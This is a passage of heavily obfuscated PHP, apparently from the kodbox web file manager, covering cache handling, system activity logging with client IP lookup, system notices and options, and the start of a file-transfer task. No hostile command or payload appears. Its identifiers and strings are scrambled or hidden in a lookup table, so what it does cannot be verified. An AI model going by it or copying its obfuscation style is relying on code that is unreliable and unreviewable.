$½¦μΣύ[233]: self::$handle = new CacheFile($ς„Λχ, $ζΝ®…); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($΄ρΓυ¶) { if (is_array($΄ρΓυ¶) || is_object($΄ρΓυ¶)) { $΄ρΓυ¶ = json_encode($΄ρΓυ¶); } $΄ρΓυ¶ = rawurlencode($΄ρΓυ¶); return md5(KOD_SITE_ID . $_SERVER[γγάψ½][11] . $΄ρΓυ¶); } public static function get($­…—£, $ςΤΘ­ζ· = false) { $Σ®½θ = self::key($­…—£); $ο±ΆƒΛπ = self::init(); if ($ςΤΘ­ζ·) { return unserialize($ο±ΆƒΛπ->get($Σ®½θ)); } if (!isset(self::$memoryCache[$Σ®½θ])) { $ΆηΣΕΫ = $ο±ΆƒΛπ->get($Σ®½θ); self::$memoryCache[$Σ®½θ] = unserialize($ΆηΣΕΫ); } return self::$memoryCache[$Σ®½θ]; } public static function set($Λƒν®, $™½εόίκ, $ηΕ”«‚ύ = false) { $λΪφ„α΄ =& $_SERVER[γγάψ½]; $­ΆΖΪ§λ = self::key($Λƒν®); if (isset(self::$memoryCache[$­ΆΖΪ§λ]) && self::$memoryCache[$­ΆΖΪ§λ] === $™½εόίκ) { return !0; } if ($ηΕ”«‚ύ === 0) { self::$memoryCache[$­ΆΖΪ§λ] = $™½εόίκ; return !0; } $ά†±πυΝ = self::init(); $–ΥύωσΪ = serialize($™½εόίκ); CacheLock::lock($Λƒν® . $λΪφ„α΄[912]); $ΚέΘζι¶ = $ά†±πυΝ->set($­ΆΖΪ§λ, $–ΥύωσΪ, $ηΕ”«‚ύ); self::$memoryCache[$­ΆΖΪ§λ] = $™½εόίκ; CacheLock::unlock($Λƒν® . $λΪφ„α΄[912]); return $ΚέΘζι¶; } public static function getCall($ΔΚ…Ά, $·ΒΧΕ—», $εΤΕυχπ, $ƒΖΖ‚Εγ = array()) { $ΖΦΪόΐ =& $_SERVER[γγάψ½]; $ΈΫ¨ϋΪΐ = self::get($ΔΚ…Ά); if ($ΈΫ¨ϋΪΐ || $ΈΫ¨ϋΪΐ === $ΖΦΪόΐ[12]) { return $ΈΫ¨ϋΪΐ; } $ΈΫ¨ϋΪΐ = call_user_func_array($εΤΕυχπ, $ƒΖΖ‚Εγ); $ΈΫ¨ϋΪΐ = $ΈΫ¨ϋΪΐ ? $ΈΫ¨ϋΪΐ : $ΖΦΪόΐ[12]; self::set($ΔΚ…Ά, $ΈΫ¨ϋΪΐ, $·ΒΧΕ—»); return $ΈΫ¨ϋΪΐ; } public static function remove($π±›ΓώΠ) { $Ψ£Γϊ = self::key($π±›ΓώΠ); unset(self::$memoryCache[$Ψ£Γϊ]); self::clearTimeout(); CacheLock::lock($π±›ΓώΠ); $§Ϋ“ = self::init()->remove($Ψ£Γϊ); CacheLock::unlock($π±›ΓώΠ); return $§Ϋ“; } public static function removeMemory($κ¶Αξ) { $ΌΚΞνΝ = self::key($κ¶Αξ); unset(self::$memoryCache[$ΌΚΞνΝ]); } public static function clearMemory($γ¨„‘ήώ = false) { if ($γ¨„‘ήώ) { $γ¨„‘ήώ = self::key($γ¨„‘ήώ); unset(self::$memoryCache[$γ¨„‘ήώ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[γγάψ½][913])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[γγάψ½][914])) { self::init()->clearTimeout(); } } } goto B”¤δθ¦„…; E‡‚ίΘδ™: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\x6d\x5f\154\157\147"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\x54\151\155\x65", "\164\151\x6d\x65", "\x69\156\x73\x65\x72\164", "\146\x75\156\143\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Α•Θγ— =& $_SERVER[γγάψ½]; return array($Α•Θγ—[2365] => LNG($Α•Θγ—[2366]), $Α•Θγ—[2367] => LNG($Α•Θγ—[2368]), $Α•Θγ—[1936] => LNG($Α•Θγ—[2369]), $Α•Θγ—[2370] => LNG($Α•Θγ—[2371]), $Α•Θγ—[2372] => LNG($Α•Θγ—[2373]), $Α•Θγ—[2374] => LNG($Α•Θγ—[2375]), $Α•Θγ—[2376] => LNG($Α•Θγ—[2377]), $Α•Θγ—[1966] => LNG($Α•Θγ—[2377]), $Α•Θγ—[1967] => LNG($Α•Θγ—[2378]), $Α•Θγ—[2379] => LNG($Α•Θγ—[2380]), $Α•Θγ—[2381] => LNG($Α•Θγ—[2382]), $Α•Θγ—[2383] => LNG($Α•Θγ—[2384]), $Α•Θγ—[2385] => LNG($Α•Θγ—[2386]), $Α•Θγ—[1964] => LNG($Α•Θγ—[2387]), $Α•Θγ—[2388] => LNG($Α•Θγ—[2389]), $Α•Θγ—[1971] => LNG($Α•Θγ—[2390]), $Α•Θγ—[2391] => LNG($Α•Θγ—[2392]), $Α•Θγ—[2393] => LNG($Α•Θγ—[2394]), $Α•Θγ—[2395] => LNG($Α•Θγ—[2396]), $Α•Θγ—[2397] => LNG($Α•Θγ—[2398]), $Α•Θγ—[1974] => LNG($Α•Θγ—[2399]), $Α•Θγ—[1975] => LNG($Α•Θγ—[2400]), $Α•Θγ—[2401] => LNG($Α•Θγ—[2402]), $Α•Θγ—[2403] => LNG($Α•Θγ—[2404]), $Α•Θγ—[2405] => LNG($Α•Θγ—[2406]), $Α•Θγ—[1969] => LNG($Α•Θγ—[2407]), $Α•Θγ—[2408] => LNG($Α•Θγ—[2409]), $Α•Θγ—[1968] => LNG($Α•Θγ—[2410]), $Α•Θγ—[2411] => LNG($Α•Θγ—[2411]), $Α•Θγ—[2412] => LNG($Α•Θγ—[2413]), $Α•Θγ—[2414] => LNG($Α•Θγ—[2411]), $Α•Θγ—[2415] => LNG($Α•Θγ—[2416]), $Α•Θγ—[2417] => LNG($Α•Θγ—[2418]), $Α•Θγ—[2419] => LNG($Α•Θγ—[2418]), $Α•Θγ—[2420] => LNG($Α•Θγ—[2421]), $Α•Θγ—[2422] => LNG($Α•Θγ—[2422]), $Α•Θγ—[2423] => LNG($Α•Θγ—[1940]), $Α•Θγ—[2424] => LNG($Α•Θγ—[2425]), $Α•Θγ—[2426] => LNG($Α•Θγ—[2427]), $Α•Θγ—[2428] => LNG($Α•Θγ—[2429]), $Α•Θγ—[2430] => LNG($Α•Θγ—[2431]), $Α•Θγ—[2432] => LNG($Α•Θγ—[2433]), $Α•Θγ—[2434] => LNG($Α•Θγ—[2434]), $Α•Θγ—[2435] => LNG($Α•Θγ—[2436]), $Α•Θγ—[2437] => LNG($Α•Θγ—[2438]), $Α•Θγ—[2439] => LNG($Α•Θγ—[2440]), $Α•Θγ—[2441] => LNG($Α•Θγ—[2442]), $Α•Θγ—[2443] => LNG($Α•Θγ—[2444]), $Α•Θγ—[2445] => LNG($Α•Θγ—[2446]), $Α•Θγ—[213] => LNG($Α•Θγ—[213]), $Α•Θγ—[214] => LNG($Α•Θγ—[2447]), $Α•Θγ—[2448] => LNG($Α•Θγ—[2448])); } private function typeFile() { $ρ•τ¨σ =& $_SERVER[γγάψ½]; $ΑχΑπ = array($ρ•τ¨σ[1971] => array($ρ•τ¨σ[1972]), $ρ•τ¨σ[2383] => array($ρ•τ¨σ[2449]), $ρ•τ¨σ[2385] => array($ρ•τ¨σ[2450]), $ρ•τ¨σ[1964] => array($ρ•τ¨σ[1965], $ρ•τ¨σ[2451]), $ρ•τ¨σ[2393] => array(), $ρ•τ¨σ[2395] => array(), $ρ•τ¨σ[2397] => array(), $ρ•τ¨σ[1974] => array($ρ•τ¨σ[1976]), $ρ•τ¨σ[1975] => array($ρ•τ¨σ[1976]), $ρ•τ¨σ[2401] => array($ρ•τ¨σ[2452]), $ρ•τ¨σ[2403] => array($ρ•τ¨σ[2452]), $ρ•τ¨σ[2405] => array($ρ•τ¨σ[2453]), $ρ•τ¨σ[2391] => array($ρ•τ¨σ[2454]), $ρ•τ¨σ[1969] => array($ρ•τ¨σ[2455]), $ρ•τ¨σ[2408] => array($ρ•τ¨σ[2456]), $ρ•τ¨σ[1968] => array($ρ•τ¨σ[1970])); return $ΑχΑπ; } private function typeAll() { $νΛξΕΜμ =& $_SERVER[γγάψ½]; $ΓΊ·‚κΔ = $this->typeList; $©•ΜΪ± = array_filter($this->typeFile()); foreach ($©•ΜΪ± as $‰ψ‡¦ => $Ύ¦·•ΰ) { $ΓΊ·‚κΔ[$Ύ¦·•ΰ[0]] = $ΓΊ·‚κΔ[$‰ψ‡¦]; } $ΓΊ·‚κΔ[$νΛξΕΜμ[1976]] = LNG($νΛξΕΜμ[2457]); $ΓΊ·‚κΔ[$νΛξΕΜμ[2452]] = LNG($νΛξΕΜμ[2458]); return $ΓΊ·‚κΔ; } public function addLog($ο½½Ϋ, $φρ”‹Β = array()) { $Χ…°½³ =& $_SERVER[γγάψ½]; if (!isset($this->typeList[$ο½½Ϋ])) { return; } $ΝΫΡί = Session::get($Χ…°½³[2134]); if (!$ΝΫΡί) { $ΝΫΡί = _get($φρ”‹Β, $Χ…°½³[1793], 0); } if ($ο½½Ϋ == $Χ…°½³[2424] && is_array($φρ”‹Β[$Χ…°½³[2459]]) && !$φρ”‹Β[$Χ…°½³[2459]]) { return; } $¤Ωµ‚Σ = get_client_ip(); if (!$φρ”‹Β || strlen(json_encode($φρ”‹Β)) >= 1024 * 64) { if ($φρ”‹Β && is_array($φρ”‹Β)) { $φρ”‹Β = array_intersect_key($φρ”‹Β, array_flip($Χ…°½³[478], $Χ…°½³[32])); $φρ”‹Β[$Χ…°½³[2460]] = $¤Ωµ‚Σ; } else { $φρ”‹Β = array($Χ…°½³[2460] => $¤Ωµ‚Σ); } } else { if (is_array($φρ”‹Β)) { $φρ”‹Β[$Χ…°½³[2460]] = $¤Ωµ‚Σ; } else { $φρ”‹Β = array($Χ…°½³[1298] => $φρ”‹Β, $Χ…°½³[2460] => $¤Ωµ‚Σ); } } $φρ”‹Β = array($Χ…°½³[1783] => Session::sign(), $Χ…°½³[1784] => intval($ΝΫΡί), $Χ…°½³[33] => $ο½½Ϋ, $Χ…°½³[1786] => json_encode($φρ”‹Β)); return parent::add($φρ”‹Β); } public function remove($ΚίΝ›ύΕ) { $this->where(array($_SERVER[γγάψ½][496] => $ΚίΝ›ύΕ))->delete(); } private function _makeOrder($Ζμ½Ά„ = '') { $ΝΙΙλυ =& $_SERVER[γγάψ½]; $ψ†±ΩΥυ = $ΝΙΙλυ[234]; $ιΑψΛ§ = array($ΝΙΙλυ[526] => $ΝΙΙλυ[527], $ΝΙΙλυ[528] => $ΝΙΙλυ[529]); $ΑύςΝσ = Input::get($ΝΙΙλυ[534], $ΝΙΙλυ[7], $ΝΙΙλυ[2174], array($ΝΙΙλυ[2089], $ΝΙΙλυ[528])); $ΑύςΝσ = $ιΑψΛ§[$ΑύςΝσ]; $Ζμ½Ά„ = $Ζμ½Ά„ . "{$ψ†±ΩΥυ}\x20{$ΑύςΝσ}"; return $this->order($Ζμ½Ά„); } public function get($ΒΫδ®”ς = '') { $‡Ύ„Ι‰ή =& $_SERVER[γγάψ½]; if (!$ΒΫδ®”ς) { show_json(array()); } $¶…΅επ« = array(); if ($ΒΫδ®”ς[$‡Ύ„Ι‰ή[1793]]) { $¶…΅επ«[$‡Ύ„Ι‰ή[1793]] = $ΒΫδ®”ς[$‡Ύ„Ι‰ή[1793]]; } if (isset($ΒΫδ®”ς[$‡Ύ„Ι‰ή[835]])) { $¤Ϊ¥ = $ΒΫδ®”ς[$‡Ύ„Ι‰ή[835]]; $ƒ ϊΪ±Ή = isset($ΒΫδ®”ς[$‡Ύ„Ι‰ή[836]]) ? $ΒΫδ®”ς[$‡Ύ„Ι‰ή[836]] : time(); $¶…΅επ«[$‡Ύ„Ι‰ή[234]] = array($‡Ύ„Ι‰ή[411], array($¤Ϊ¥, $ƒ ϊΪ±Ή)); } if ($ΒΫδ®”ς[$‡Ύ„Ι‰ή[33]]) { $ΧψΏβ = explode($‡Ύ„Ι‰ή[50], $ΒΫδ®”ς[$‡Ύ„Ι‰ή[33]]); $΅Ι¤µΐ = $this->typeFile(); $ΟΒΎ›ξί = array(); foreach ($ΧψΏβ as $®ΛΣη) { $ΟΒΎ›ξί[] = $®ΛΣη; if (isset($΅Ι¤µΐ[$®ΛΣη])) { $ΟΒΎ›ξί = array_merge($ΟΒΎ›ξί, $΅Ι¤µΐ[$®ΛΣη]); } } $ΟΒΎ›ξί = array_unique($ΟΒΎ›ξί); if ($ΟΒΎ›ξί) { $¶…΅επ«[$‡Ύ„Ι‰ή[33]] = array($‡Ύ„Ι‰ή[7], $ΟΒΎ›ξί); } } else { $¶…΅επ«[$‡Ύ„Ι‰ή[33]] = array($‡Ύ„Ι‰ή[2461], $‡Ύ„Ι‰ή[2462]); } if (!empty($ΒΫδ®”ς[$‡Ύ„Ι‰ή[2460]])) { $¶…΅επ«[$‡Ύ„Ι‰ή[529]] = array($‡Ύ„Ι‰ή[462], "\x25{$ΒΫδ®”ς[$‡Ύ„Ι‰ή[2460]]}\45"); } $—Ωπι = $this->_makeOrder()->where($¶…΅επ«)->selectPage(); if (empty($—Ωπι[$‡Ύ„Ι‰ή[448]])) { show_json(array(), !0, $—Ωπι[$‡Ύ„Ι‰ή[445]]); } $—Ωπι[$‡Ύ„Ι‰ή[448]] = $this->logList($—Ωπι[$‡Ύ„Ι‰ή[448]]); return $—Ωπι; } private function ipAddress(&$£Ρφ–ν) { $ΟΙ‰¦όζ =& $_SERVER[γγάψ½]; if (!empty($£Ρφ–ν[$ΟΙ‰¦όζ[2460]])) { $»΄Ά = IpLocation::get($£Ρφ–ν[$ΟΙ‰¦όζ[2460]]); } else { $»΄Ά = LNG($ΟΙ‰¦όζ[2463]); } $£Ρφ–ν[$ΟΙ‰¦όζ[2464]] = $»΄Ά; } private function descZipDownload($ή…Αω±Σ, &$Ό΅•©ύ) { $ΙΐΛκ¤ =& $_SERVER[γγάψ½]; if (!isset($ή…Αω±Σ[$ΙΐΛκ¤[2465]])) { return; } $½ι½ΖΜ‚ = json_decode($ή…Αω±Σ[$ΙΐΛκ¤[2465]], !0); foreach ($½ι½ΖΜ‚ as $ο°ζΥΠ) { try { $ςΒφ°Ά³ = IO::infoFullSimple($ο°ζΥΠ[$ΙΐΛκ¤[87]]); } catch (Exception $¨ΰ¨ήνι) { continue; } $ή…Αω±Σ[$ΙΐΛκ¤[87]] = $ο°ζΥΠ[$ΙΐΛκ¤[87]]; $Ό΅•©ύ[] = $ή…Αω±Σ[$ΙΐΛκ¤[194]] = $ςΒφ°Ά³[$ΙΐΛκ¤[194]]; $Ό΅•©ύ[] = $ή…Αω±Σ[$ΙΐΛκ¤[2228]] = $ςΒφ°Ά³[$ΙΐΛκ¤[193]]; break; } return $ή…Αω±Σ; } private function getSourceList(&$°ω¶) { $άΠ¨ΛΑό =& $_SERVER[γγάψ½]; $ζΆΙΖή = array(); foreach ($°ω¶ as $ΌσΞ => $†Ή‘π›) { $—φ†μό = json_decode($†Ή‘π›[$άΠ¨ΛΑό[529]], !0); if ($†Ή‘π›[$άΠ¨ΛΑό[33]] == $άΠ¨ΛΑό[1967]) { $—φ†μό = $this->descZipDownload($—φ†μό, $ζΆΙΖή); $°ω¶[$ΌσΞ][$άΠ¨ΛΑό[529]] = json_encode($—φ†μό); continue; } if (strpos($†Ή‘π›[$άΠ¨ΛΑό[33]], $άΠ¨ΛΑό[2230]) !== 0) { if (!isset($—φ†μό[$άΠ¨ΛΑό[87]]) || strpos($†Ή‘π›[$άΠ¨ΛΑό[33]], $άΠ¨ΛΑό[2466]) !== 0) { continue; } try { $ΕΪΏμη΅ = IO::infoFullSimple($—φ†μό[$άΠ¨ΛΑό[87]]); } catch (Exception $ο—π¨ΐ) { continue; } $ζΆΙΖή[] = $—φ†μό[$άΠ¨ΛΑό[194]] = $ΕΪΏμη΅[$άΠ¨ΛΑό[194]]; $ζΆΙΖή[] = $—φ†μό[$άΠ¨ΛΑό[2228]] = $ΕΪΏμη΅[$άΠ¨ΛΑό[193]]; $°ω¶[$ΌσΞ][$άΠ¨ΛΑό[529]] = json_encode($—φ†μό); continue; } $ζΆΙΖή[] = $—φ†μό[$άΠ¨ΛΑό[194]]; $ζΆΙΖή[] = $—φ†μό[$άΠ¨ΛΑό[2228]]; if ($—φ†μό[$άΠ¨ΛΑό[33]] == $άΠ¨ΛΑό[628]) { $ζΆΙΖή[] = $—φ†μό[$άΠ¨ΛΑό[529]][$άΠ¨ΛΑό[1250]]; $ζΆΙΖή[] = $—φ†μό[$άΠ¨ΛΑό[529]][$άΠ¨ΛΑό[1251]]; } if ($—φ†μό[$άΠ¨ΛΑό[33]] == $άΠ¨ΛΑό[2239]) { $ζΆΙΖή[] = $—φ†μό[$άΠ¨ΛΑό[529]][$άΠ¨ΛΑό[194]]; } } if (!$ζΆΙΖή) { return array(); } return Model($άΠ¨ΛΑό[905])->sourceListInfo($ζΆΙΖή, !0); } private function logList($ΈϊΏ£ή®) { $¥«Ιτγ· =& $_SERVER[γγάψ½]; $Τ¶µ = array_to_keyvalue($ΈϊΏ£ή®, $¥«Ιτγ·[12], $¥«Ιτγ·[1793]); $ΎΘ¶ΥΨ = Model($¥«Ιτγ·[602])->userListInfo(array_unique($Τ¶µ)); $ΫεζΫΉ = $this->getSourceList($ΈϊΏ£ή®); $δ–ύΤΆ = $this->typeAll(); $ν΅™χΛ = array(); $ξθΣΘ΄β = array(); foreach ($ΈϊΏ£ή® as $”¶ύΌ‹γ => $–†Πρ) { $θ–Η“‹ = $–†Πρ[$¥«Ιτγ·[33]]; $ΥΌΜΡ† = isset($ΎΘ¶ΥΨ[$–†Πρ[$¥«Ιτγ·[1793]]]) ? $ΎΘ¶ΥΨ[$–†Πρ[$¥«Ιτγ·[1793]]] : !1; $§αΑΓ‹ = strpos($θ–Η“‹, $¥«Ιτγ·[2467]) === 0 ? LNG($¥«Ιτγ·[2468]) : LNG($¥«Ιτγ·[2463]); $–†Πρ[$¥«Ιτγ·[32]] = isset($ΥΌΜΡ†[$¥«Ιτγ·[32]]) ? $ΥΌΜΡ†[$¥«Ιτγ·[32]] : LNG($¥«Ιτγ·[2463]); $–†Πρ[$¥«Ιτγ·[2290]] = isset($ΥΌΜΡ†[$¥«Ιτγ·[2290]]) ? $ΥΌΜΡ†[$¥«Ιτγ·[2290]] : $¥«Ιτγ·[12]; $–†Πρ[$¥«Ιτγ·[1679]] = isset($δ–ύΤΆ[$θ–Η“‹]) ? $δ–ύΤΆ[$θ–Η“‹] : $§αΑΓ‹; $–†Πρ[$¥«Ιτγ·[2173]] = $ΥΌΜΡ†; $‰°Λΐί£ = json_decode($–†Πρ[$¥«Ιτγ·[529]], !0); $–†Πρ[$¥«Ιτγ·[2460]] = isset($‰°Λΐί£[$¥«Ιτγ·[2460]]) ? $‰°Λΐί£[$¥«Ιτγ·[2460]] : $¥«Ιτγ·[12]; $–†Πρ[$¥«Ιτγ·[2464]] = IpLocation::get($–†Πρ[$¥«Ιτγ·[2460]]); if (strpos($θ–Η“‹, $¥«Ιτγ·[2230]) === 0 || isset($‰°Λΐί£[$¥«Ιτγ·[2228]])) { $‰°Λΐί£[$¥«Ιτγ·[90]] = $ΫεζΫΉ[$‰°Λΐί£[$¥«Ιτγ·[194]]]; $‰°Λΐί£[$¥«Ιτγ·[2244]] = $ΫεζΫΉ[$‰°Λΐί£[$¥«Ιτγ·[2228]]]; if ($‰°Λΐί£[$¥«Ιτγ·[33]] == $¥«Ιτγ·[628]) { $‰°Λΐί£[$¥«Ιτγ·[529]][$¥«Ιτγ·[1250]] = $ΫεζΫΉ[$‰°Λΐί£[$¥«Ιτγ·[529]][$¥«Ιτγ·[1250]]]; $‰°Λΐί£[$¥«Ιτγ·[529]][$¥«Ιτγ·[1251]] = $ΫεζΫΉ[$‰°Λΐί£[$¥«Ιτγ·[529]][$¥«Ιτγ·[1251]]]; } if ($‰°Λΐί£[$¥«Ιτγ·[33]] == $¥«Ιτγ·[2239]) { $‰°Λΐί£[$¥«Ιτγ·[529]][$¥«Ιτγ·[194]] = $ΫεζΫΉ[$‰°Λΐί£[$¥«Ιτγ·[529]][$¥«Ιτγ·[194]]]; } if ($‰°Λΐί£[$¥«Ιτγ·[33]] == $¥«Ιτγ·[1962]) { $‰°Λΐί£[$¥«Ιτγ·[2244]] = $‰°Λΐί£[$¥«Ιτγ·[90]]; $‰°Λΐί£[$¥«Ιτγ·[2228]] = $‰°Λΐί£[$¥«Ιτγ·[2244]][$¥«Ιτγ·[194]]; $‰°Λΐί£[$¥«Ιτγ·[90]] = !1; $‰°Λΐί£[$¥«Ιτγ·[194]] = $¥«Ιτγ·[12]; } $λόϋΤϋ = array($¥«Ιτγ·[1962], $¥«Ιτγ·[2226]); if (!in_array($‰°Λΐί£[$¥«Ιτγ·[33]], $λόϋΤϋ)) { if ($‰°Λΐί£[$¥«Ιτγ·[90]] && $‰°Λΐί£[$¥«Ιτγ·[90]][$¥«Ιτγ·[191]] == $¥«Ιτγ·[192]) { $ξθΣΘ΄β[] = $–†Πρ[$¥«Ιτγ·[478]]; unset($ΈϊΏ£ή®[$”¶ύΌ‹γ]); continue; } if ($‰°Λΐί£[$¥«Ιτγ·[2244]] && $‰°Λΐί£[$¥«Ιτγ·[2244]][$¥«Ιτγ·[191]] == $¥«Ιτγ·[192]) { $ξθΣΘ΄β[] = $–†Πρ[$¥«Ιτγ·[478]]; unset($ΈϊΏ£ή®[$”¶ύΌ‹γ]); continue; } } } $–†Πρ[$¥«Ιτγ·[529]] = $‰°Λΐί£; unset($–†Πρ[$¥«Ιτγ·[2469]]); $ν΅™χΛ[] = $–†Πρ; } $this->clearSystemPathLog($ξθΣΘ΄β); return $ν΅™χΛ; } private function clearSystemPathLog($ΫΊψ›«) { $†Φ«΅α =& $_SERVER[γγάψ½]; if (count($ΫΊψ›«) == 0) { return; } $‹―Υαβ = array($†Φ«΅α[478] => array($†Φ«΅α[7], array_unique($ΫΊψ›«))); $this->where($‹―Υαβ)->delete(); } public function deviceList($εα“Τρ, $ΪΦ½Λμ = 0) { $οβ±ο―ς =& $_SERVER[γγάψ½]; $ƒµΰ¶ΡΔ = array($οβ±ο―ς[1793] => $εα“Τρ, $οβ±ο―ς[234] => array($οβ±ο―ς[1100], $ΪΦ½Λμ), $οβ±ο―ς[33] => $οβ±ο―ς[1936]); $ΎναΨ‹± = array(); $Άγλ² = $this->field($οβ±ο―ς[2470])->where($ƒµΰ¶ΡΔ)->order($οβ±ο―ς[2242])->limit(50)->select(); foreach ($Άγλ² as $εΚΤΫ½ => $ΰ’Ψ†μ΄) { if ($εΚΤΫ½ > 0 && abs($ΰ’Ψ†μ΄[$οβ±ο―ς[234]] - $Άγλ²[$εΚΤΫ½ - 1][$οβ±ο―ς[234]]) < 5) { continue; } $«ƒΨΕυ = json_decode($ΰ’Ψ†μ΄[$οβ±ο―ς[529]], !0); $ΰ’Ψ†μ΄[$οβ±ο―ς[2460]] = isset($«ƒΨΕυ[$οβ±ο―ς[2460]]) ? $«ƒΨΕυ[$οβ±ο―ς[2460]] : $οβ±ο―ς[12]; unset($«ƒΨΕυ[$οβ±ο―ς[2460]]); $“ΰψΒ΄ = $this->deviceType($«ƒΨΕυ[$οβ±ο―ς[2231]]); if (isset($ΎναΨ‹±[$“ΰψΒ΄])) { continue; } $ΰ’Ψ†μ΄[$οβ±ο―ς[2464]] = IpLocation::get($ΰ’Ψ†μ΄[$οβ±ο―ς[2460]]); $ΰ’Ψ†μ΄[$οβ±ο―ς[529]] = $«ƒΨΕυ; $ΎναΨ‹±[$“ΰψΒ΄] = $ΰ’Ψ†μ΄; } return array_values($ΎναΨ‹±); } public function deviceType($–κλΦ¬Η) { return $–κλΦ¬Η; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\156\x6f\x74\151\143\x65\114\151\163\x74"; public $field = array("\156\x61\x6d\145", "\143\157\x6e\x74\145\156\x74", "\141\x75\x74\150", "\155\x6f\x64\x65", "\x74\151\x6d\x65", "\164\171\x70\145", "\154\x65\166\145\154", "\x65\x6e\141\142\154\x65", "\x73\x6f\x72\x74"); public function listData($—²κά¬ΐ = false, $Ο†‚› = "\163\157\162\x74", $άΜβ°µ” = false) { return parent::listData($—²κά¬ΐ, $Ο†‚›, $άΜβ°µ”); } public function add($ΣΉΪίβ©) { $©¬Ζή· =& $_SERVER[γγάψ½]; $„Ύν½ώ = time(); if ($ΣΉΪίβ©[$©¬Ζή·[16]] == $©¬Ζή·[2471]) { $„Ύν½ώ = strtotime($ΣΉΪίβ©[$©¬Ζή·[207]]); } $ΣΉΪίβ©[$©¬Ζή·[207]] = $„Ύν½ώ; return parent::insert($ΣΉΪίβ©); } public function update($‚ςω…ο®, $µΦθΕζ) { $΅±ΐ‚Ώ =& $_SERVER[γγάψ½]; $»»δόιΙ = $this->listData($‚ςω…ο®); if (!$»»δόιΙ) { return !1; } $π“ΝΪξΆ = time(); if ($µΦθΕζ[$΅±ΐ‚Ώ[16]] == $΅±ΐ‚Ώ[2471]) { $π“ΝΪξΆ = strtotime($µΦθΕζ[$΅±ΐ‚Ώ[207]]); } $µΦθΕζ[$΅±ΐ‚Ώ[207]] = $π“ΝΪξΆ; return parent::update($‚ςω…ο®, $µΦθΕζ); } public function remove($εΟι……) { $οΒΗΏΕ = $this->listData($εΟι……); if (!$οΒΗΏΕ || $οΒΗΏΕ[$_SERVER[γγάψ½][192]]) { return !1; } return parent::remove($εΟι……); } public function sort($² »Β, $ύώόμ«ά) { return parent::update($² »Β, $ύώόμ«ά); } public function enable($„Κ†Γέ, $Ιαυ•θ) { return parent::update($„Κ†Γέ, array($_SERVER[γγάψ½][2472] => $Ιαυ•θ)); } private function initUserOption() { $­ξ®ΩΠΎ =& $_SERVER[γγάψ½]; $this->optionType = $­ξ®ΩΠΎ[2473]; $this->modelType = $­ξ®ΩΠΎ[2474]; $this->field = array($­ξ®ΩΠΎ[2475], $­ξ®ΩΠΎ[32], $­ξ®ΩΠΎ[207], $­ξ®ΩΠΎ[33], $­ξ®ΩΠΎ[2476], $­ξ®ΩΠΎ[825], $­ξ®ΩΠΎ[229]); } public function userNoticeGet($ΨΘ”ΎΦ― = false) { $this->initUserOption(); return parent::listData($ΨΘ”ΎΦ―, $_SERVER[γγάψ½][478], !0); } public function userNoticeAdd($¬¤‚ΐ) { $θ‘γΚΐθ =& $_SERVER[γγάψ½]; $this->initUserOption(); $σ’ Ϋή = $this->findByKey($θ‘γΚΐθ[2475], $¬¤‚ΐ[$θ‘γΚΐθ[478]]); if ($σ’ Ϋή) { return !0; } $£ω„»―Ί = array($θ‘γΚΐθ[2475] => $¬¤‚ΐ[$θ‘γΚΐθ[478]], $θ‘γΚΐθ[32] => $¬¤‚ΐ[$θ‘γΚΐθ[32]], $θ‘γΚΐθ[207] => $¬¤‚ΐ[$θ‘γΚΐθ[207]], $θ‘γΚΐθ[33] => isset($¬¤‚ΐ[$θ‘γΚΐθ[33]]) ? $¬¤‚ΐ[$θ‘γΚΐθ[33]] : 1, $θ‘γΚΐθ[2476] => isset($¬¤‚ΐ[$θ‘γΚΐθ[2476]]) ? $¬¤‚ΐ[$θ‘γΚΐθ[2476]] : 0, $θ‘γΚΐθ[825] => 0, $θ‘γΚΐθ[229] => 0); return parent::insert($£ω„»―Ί); } public function userNoticeEdit($ζχ΄»λ”, $²·ΚιαΨ) { $this->initUserOption(); return parent::update($ζχ΄»λ”, $²·ΚιαΨ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\x74\145\155\x5f\157\x70\164\x69\157\x6e"; protected $jsonField = array("\x6d\x65\156\x75", "\162\157\154\145", "\162\157\154\145\107\x72\x6f\x75\160", "\x72\x65\x67\x69\163\x74", "\145\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($τΓζΥλ§) { return "\x53\x79\x73\164\145\155\117\160\x74\151\157\x6e\x5f{$τΓζΥλ§}"; } protected function optionDefault($―Ψπόυ = '') { $ΤΕΟεΆό =& $_SERVER[γγάψ½]; if ($―Ψπόυ == $ΤΕΟεΆό[12]) { return $GLOBALS[$ΤΕΟεΆό[6]][$ΤΕΟεΆό[460]]; } } } goto dΌχ‰ΔΌΆ°; Fν¤Ω·¥”: class TaskFileTransfer extends Task { protected function startAfter() { $²ΗΒΜ– =& $_SERVER[γγάψ½]; $ƒο•±Τ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($²ΗΒΜ–[1824], array($this, $²ΗΒΜ–[1825])); Hook::bind($²ΗΒΜ–[1319], array($this, $²ΗΒΜ–[1826])); Hook::bind($²ΗΒΜ–[1827], array($this, $²ΗΒΜ–[1828])); Hook::bind($²ΗΒΜ–[676], array($this, $²ΗΒΜ–[1829])); Hook::bind($²ΗΒΜ–[677], array($this, $²ΗΒΜ–[1830])); Hook::bind($²ΗΒΜ–[683], array($this, $²ΗΒΜ–[1831])); Hook::bind($²ΗΒΜ–[684], array($this, $²ΗΒΜ–[1832])); Hook::bind($²ΗΒΜ–[679], array($this, $²ΗΒΜ–[1833])); Hook::bind($²ΗΒΜ–[681], array($this, $²ΗΒΜ–[1834])); Hook::bind($²ΗΒΜ–[645], array($this, $²ΗΒΜ–[1835])); Hook::bind($²ΗΒΜ–[642], array($this, $²ΗΒΜ–[1835])); Hook::bind($²ΗΒΜ–[647], array($this, $²ΗΒΜ–[1835])); Hook::bind($²ΗΒΜ–[649], array($this, $²ΗΒΜ–[1835])); Hook::bind($²ΗΒΜ–[651], array($this, 